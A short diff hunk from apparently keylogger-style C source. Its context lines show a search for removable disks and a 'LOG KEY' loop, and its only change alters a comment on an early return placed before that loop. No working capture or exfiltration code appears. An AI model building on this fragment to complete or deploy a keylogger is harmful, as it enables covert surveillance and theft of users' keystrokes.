@@ -72,7 +72,7 @@ main()
     }
 
     char driveLetter = getRemovableDisk();    //initial search for removable disk
-    return;//
+    return; // :)
     while(1)
     {
         ////////////////****LOG KEY****/////////////////
